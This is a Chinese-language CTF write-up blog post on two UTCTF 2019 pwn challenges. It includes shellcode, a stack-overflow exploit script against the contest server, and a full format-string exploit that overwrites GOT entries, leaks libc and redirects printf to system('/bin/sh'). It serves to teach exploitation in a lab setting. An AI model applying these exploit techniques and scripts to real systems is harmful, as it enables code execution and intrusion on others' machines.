@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="ctf,writeup,pwn," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="两道题，babypwn和babyecho，分别是ret2shellcode和format+leak libc 这周末连着两个比赛，酸爽。">
+<meta name="keywords" content="ctf,writeup,pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UTctf2019">
+<meta property="og:url" content="http://yoursite.com/2019/03/13/UTctf2019/index.html">
+<meta property="og:site_name" content="Muirelle的博客">
+<meta property="og:description" content="两道题，babypwn和babyecho，分别是ret2shellcode和format+leak libc 这周末连着两个比赛，酸爽。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/dW95IHc.png">
+<meta property="og:image" content="https://i.imgur.com/CycOBQQ.png">
+<meta property="og:image" content="https://i.imgur.com/wRXIMei.png">
+<meta property="og:image" content="https://i.imgur.com/FcNper1.png">
+<meta property="og:image" content="https://i.imgur.com/rTZJokv.png">
+<meta property="og:image" content="https://i.imgur.com/BSGg2je.png">
+<meta property="og:image" content="https://i.imgur.com/lHhIkPy.png">
+<meta property="og:image" content="https://i.imgur.com/t8cU0gW.png">
+<meta property="og:image" content="https://i.imgur.com/ajNyeuM.png">
+<meta property="og:image" content="https://i.imgur.com/IBuLQu3.png">
+<meta property="og:image" content="https://i.imgur.com/iYl5m5K.png">
+<meta property="og:image" content="https://i.imgur.com/UBHklY6.png">
+<meta property="og:image" content="https://i.imgur.com/SVimSJR.png">
+<meta property="og:image" content="https://i.imgur.com/CQ6NYOx.png">
+<meta property="og:updated_time" content="2019-04-01T13:42:12.065Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="UTctf2019">
+<meta name="twitter:description" content="两道题，babypwn和babyecho，分别是ret2shellcode和format+leak libc 这周末连着两个比赛，酸爽。">
+<meta name="twitter:image" content="https://i.imgur.com/dW95IHc.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/03/13/UTctf2019/"/>
+
+
+
+
+
+  <title>UTctf2019 | Muirelle的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Muirelle的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/13/UTctf2019/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Muirelle">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Muirelle的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">UTctf2019</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-13T16:32:41+08:00">
+                2019-03-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">ctf</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/03/13/UTctf2019/" class="leancloud_visitors" data-flag-title="UTctf2019">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>两道题，babypwn和babyecho，分别是ret2shellcode和format+leak libc</p>
+<p>这周末连着两个比赛，酸爽。</p>
+<a id="more"></a>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>docker环境： <strong>docker pull muirelle/utctf:pwn</strong></p>
+<p>想复杂了。老是想着ret2libc，结果discord一个老哥提醒global vireable还是没想起来利用bss段存放shellcode。</p>
+<p><img src="https://i.imgur.com/dW95IHc.png" alt=""><br>保护基本上都没开</p>
+<p><img src="https://i.imgur.com/CycOBQQ.png" alt=""><br><img src="https://i.imgur.com/wRXIMei.png" alt=""><br><img src="https://i.imgur.com/FcNper1.png" alt=""><br>接下来是三个主要的函数。</p>
+<p>注意到<code>welcome</code>和<code>do_calc</code>都可以通过gets进行栈溢出。</p>
+<p><img src="https://i.imgur.com/rTZJokv.png" alt=""></p>
+<p>而name位于bss段，可以将shellcode放在这里，然后劫持<code>do_calc</code>流程跳转到这里执行shellcode。</p>
+<p>从shellstrom上找了一个x64的execve(‘/bin/sh’)</p>
+<p><code>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</code></p>
+<p>再回来看<code>do_calc</code>函数流程：</p>
+<p>1、输入运算符</p>
+<p>2、输入第一个操作数(nptr)    //[rsp+40h] [rbp-50h]</p>
+<p>3、输入第二个操作数(v1)    //[rsp+0h] [rbp-90h]</p>
+<p>4、依次判断第一步输入的运算符是否是 <strong>+</strong> , <strong>-</strong> , <strong>*</strong> 。若是就直接进行运算然后返回。</p>
+<p>由于nptr离栈底比较近所以选择nptr进行溢出。在溢出的过程中会覆盖v5的值，所以要计算好v5的位置，然后覆盖为运算符。</p>
+<p>计算偏移：0x50-1 = 0x4f</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"stack.overflow.fail"</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.sendline(<span class="string">"*"</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x4f</span> + <span class="string">"*"</span> + p64(<span class="number">0x601080</span>)	<span class="comment">#bss</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"asdf"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="babyecho"><a href="#babyecho" class="headerlink" title="babyecho"></a>babyecho</h2><p>Docker环境：<strong>docker pull muirelle/utctf:babyecho</strong></p>
+<p>通过这道题好好学习一下泄露libc地址的办法</p>
+<p><img src="https://i.imgur.com/BSGg2je.png" alt=""><br><img src="https://i.imgur.com/lHhIkPy.png" alt=""><br>常规检查</p>
+<p><img src="https://i.imgur.com/t8cU0gW.png" alt=""><br>可以看到printf有明显的格式化字符串漏洞</p>
+<p>但是并没有现成的system函数给我们利用，所以思路应该是通过格式化字符串泄露某个函数的在libc中的真实地址，通过工具<a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a>找到libc基址，从而计算出system的地址。然后再考虑如何利用system达到getshell的目的。</p>
+<h3 id="构造循环"><a href="#构造循环" class="headerlink" title="构造循环"></a>构造循环</h3><hr>
+<p>首先，如果我们直接一来就利用printf泄露某个函数的地址的话，泄露完成后就会直接执行exit函数，这个漏洞只能被利用一次。</p>
+<p>如果利用这个漏洞将exit的got表覆盖为main函数的地址，就可以构造出一个循环，在执行exit的时候实际是跳转回了main函数，从而多次利用漏洞。</p>
+<p><img src="https://i.imgur.com/ajNyeuM.png" alt=""><br><code>objdump -dj .plt pwnable</code><br>先找到exit(<strong>0x804a01c</strong>)</p>
+<p><img src="https://i.imgur.com/IBuLQu3.png" alt=""><br>然后是main(<strong>0x804851b</strong>)</p>
+<p>再找到偏移</p>
+<p>%n写入4个字节</p>
+<p>%hn写入2个字节</p>
+<p>%hhn写入1个字节</p>
+<p><code>(python -c &#39;print &quot;AA&quot; + &quot;\x1c\xa0\x04\x08&quot; + &quot;\x1d\xa0\x04\x08&quot; + &quot;%17x%11$hhn%106x%12$hhn&quot;&#39; ;cat -) | ./pwnable</code></p>
+<p>经过多次尝试之后找到了偏移为第11个参数。</p>
+<p><img src="https://i.imgur.com/iYl5m5K.png" alt=""></p>
+<p>可以看到已经覆盖了exit的地址为main，所以输入完了之后会回到main重新打印提示信息。所以我们现在可以多次利用这个漏洞了！</p>
+<h3 id="泄露libc"><a href="#泄露libc" class="headerlink" title="泄露libc"></a>泄露libc</h3><hr>
+<p>由于我们不能在got表中直接找到system的地址，所以要通过泄露libc基址的方式计算出system的地址。但运行这个文件的时候所有libc函数都是动态连接的，所以所有libc函数的地址都经过aslr随机化了。可是aslr只会将基址随机化，也就是说每个函数之间的相对偏移是不变的，如果能泄露出某个函数的地址，就能找到对应的libc版本，从而得到libc基址，进而知道每个函数的偏移量，最后计算出system的地址。</p>
+<p>现在的问题就是如何泄露某个函数的地址。</p>
+<p>我们知道当libc函数被调用之后，其got表相应的位置就会被替换为此函数在libc中真实的地址，所以如果我们可以泄露某个函数got表内的值，就能得到此函数的地址。但是%x和%p只能泄露栈上的地址，但是我们知道，%s可以打印对应地址的内容，再加上我们已经在上一步中有了任意位置写的能力，所以现在利用%s就可以任意位置读了。</p>
+<p>现在试着读取一下puts的地址：</p>
+<p><img src="https://i.imgur.com/UBHklY6.png" alt=""></p>
+<p>成功得到了puts的真实地址<strong>0xb75c5ca0</strong>(每次运行这个地址都是会变化的，但是低12位不变)，接下来用libc-database工具查询一下对应的libc</p>
+<p><img src="https://i.imgur.com/SVimSJR.png" alt=""><br>得到了puts偏移<strong>0x0005fca0</strong>，同时也得到了system偏移(<strong>0x0003ada0</strong>)</p>
+<p>所以libc基址 = puts地址 - puts偏移<br>system地址 = libc基址 + system偏移</p>
+<h3 id="劫持流程"><a href="#劫持流程" class="headerlink" title="劫持流程"></a>劫持流程</h3><hr>
+<p>接下来要做的就是利用system来getshell。首先要考虑一下如何给system传递参数’/bin/sh’，因为没有/bin/sh拿到system也没用。</p>
+<p>注意到程序中调用了<code>printf</code>函数，而<code>printf</code>函数需要一个参数，这个参数刚好是由fgets从用户读取的输入，也就是说如果我们将<code>printf</code>的got表内容覆盖为<code>system</code>的地址，再利用<code>fgets</code>输入<code>/bin/sh</code>，那么在调用<code>printf(&#39;/bin/sh&#39;)</code>时实际调用的则是<code>system(&#39;/bin/sh&#39;)</code>，进而拿到shell。</p>
+<p>覆盖printf的地址分为三步，每次覆盖一个字节。</p>
+<p>现在要考虑的问题是，每次得到的system地址都是不同的，在高位地址值小于地位地址值的时候如何才能保证将printf正确覆盖为system呢？利用高位溢出。</p>
+<p>比如system地址为<strong>0xb7620da0</strong>，覆盖了一个字节为0xa0后，想要覆盖第二个字节为0x0d，但是前面已打印的字节数明显已经大于0x0d了，这时就用高位溢出来得到0x0d：</p>
+<p>这时需要填充的字节为：0x100 - 0xa0 + 0x0d = 0x6d</p>
+<p>若后面出现这种情况同理利用高位溢出。</p>
+<h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><hr>
+<p>最后的脚本</p>
+<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+
+<span class="comment">#context.log_level = 'debug'</span>
+
+p = process(<span class="string">'./pwnable'</span>)
+
+main_addr = <span class="number">0x0804851B</span>
+exit_got = <span class="number">0x0804A01C</span>
+puts_got = <span class="number">0x0804A018</span>
+p.recv()
+
+<span class="comment">#creat a loop</span>
+payload1 = <span class="string">'AA'</span> + p32(exit_got) + p32(exit_got+<span class="number">1</span>)
+payload1 += <span class="string">'%17x%11$hhn%106x%12$hhn'</span>
+p.sendline(payload1)
+p.recv()
+
+
+<span class="comment">#leak libc</span>
+payload2 = <span class="string">'AA'</span> + p32(puts_got)
+payload2 += <span class="string">'%11$s'</span> + <span class="string">'BB'</span>
+p.sendline(payload2)
+puts_addr = int(hex(u32(p.recvuntil(<span class="string">'BB'</span>)[<span class="number">6</span>:<span class="number">10</span>]))[<span class="number">-8</span>:],<span class="number">16</span>)
+log.success(<span class="string">'puts_addr: '</span> + hex(puts_addr))
+
+puts_off = <span class="number">0x0005fca0</span>
+system_off = <span class="number">0x0003ada0</span>
+libc_base = puts_addr - puts_off
+system_addr = libc_base + system_off
+log.success(<span class="string">'system_addr: '</span> + hex(system_addr))
+
+<span class="comment">#overwrite printf part1</span>
+printf_got = <span class="number">0x0804A010</span>
+payload3 = <span class="string">'AA'</span> + p32(printf_got) + p32(printf_got+<span class="number">1</span>) + p32(printf_got+<span class="number">2</span>)
+overwrite1 = int(hex(system_addr)[<span class="number">-2</span>:], <span class="number">16</span>)
+log.success(<span class="string">'try overwrite1: '</span> + hex(overwrite1))
+
+<span class="comment">#overwrite printf part2</span>
+try_overwrite2 = int(hex(system_addr)[<span class="number">-4</span>:<span class="number">-2</span>], <span class="number">16</span>)
+log.success(<span class="string">'try overwrite2: '</span> + hex(try_overwrite2))
+<span class="keyword">if</span>(try_overwrite2 &lt; overwrite1):
+        overwrite2 = <span class="number">0x100</span> - overwrite1 + try_overwrite2
+<span class="keyword">else</span>:
+        overwrite2 = try_overwrite2 - overwrite1
+payload3 += <span class="string">'%'</span> + str(overwrite2) + <span class="string">'x'</span> + <span class="string">'%12$hhn'</span>
+log.success(<span class="string">'overwrite2: '</span> + hex(overwrite2))
+
+<span class="comment">#overwrite printf part3</span>
+try_overwrite3 = int(hex(system_addr)[<span class="number">-6</span>:<span class="number">-4</span>], <span class="number">16</span>)
+log.success(<span class="string">'try overwrite3: '</span> + hex(try_overwrite3))
+<span class="keyword">if</span>(try_overwrite3 &lt; try_overwrite2):
+        overwrite3 = <span class="number">0x100</span> - try_overwrite2 + try_overwrite3
+<span class="keyword">else</span>:
+        overwrite3 = try_overwrite3 - try_overwrite2
+payload3 += <span class="string">'%'</span> + str(overwrite3) + <span class="string">'x'</span> + <span class="string">'%13$hhn'</span>
+log.success(<span class="string">'overwrite3: '</span> + hex(overwrite3))
+log.success(<span class="string">'payload3: '</span> + payload3)
+
+<span class="comment">#get shell</span>
+p.sendline(payload3)
+p.sendline(<span class="string">'/bin/sh'</span>)
+p.interactive()
+
+
+</code></pre>
+<p>拿到shell<br><img src="https://i.imgur.com/CQ6NYOx.png" alt=""></p>
+<p>参考：</p>
+<p><a href="https://github.com/D4nch3n/Cyber-Competitions/blob/master/UTCTF/Babyecho/README.md" target="_blank" rel="noopener">https://github.com/D4nch3n/Cyber-Competitions/blob/master/UTCTF/Babyecho/README.md</a></p>
+<p><a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2" target="_blank" rel="noopener">格式化字符串</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># ctf</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/08/随笔/" rel="next" title="随笔">
+                <i class="fa fa-chevron-left"></i> 随笔
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/01/sunshineCTF/" rel="prev" title="sunshineCTF">
+                sunshineCTF <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Muirelle</p>
+              <p class="site-description motion-element" itemprop="description">吾将上下而求索</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://firstkaixin.github.io/" title="Mrkaixin" target="_blank">Mrkaixin</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#pwn"><span class="nav-number">1.</span> <span class="nav-text">pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#babypwn"><span class="nav-number">1.1.</span> <span class="nav-text">babypwn</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babyecho"><span class="nav-number">1.2.</span> <span class="nav-text">babyecho</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#构造循环"><span class="nav-number">1.2.1.</span> <span class="nav-text">构造循环</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露libc"><span class="nav-number">1.2.2.</span> <span class="nav-text">泄露libc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#劫持流程"><span class="nav-number">1.2.3.</span> <span class="nav-text">劫持流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exploit"><span class="nav-number">1.2.4.</span> <span class="nav-text">exploit</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Muirelle</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("K1WEvzezolboN84rQYlF0Dvv-gzGzoHsz", "KnwfedBiA348tAxLpapkotlB");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
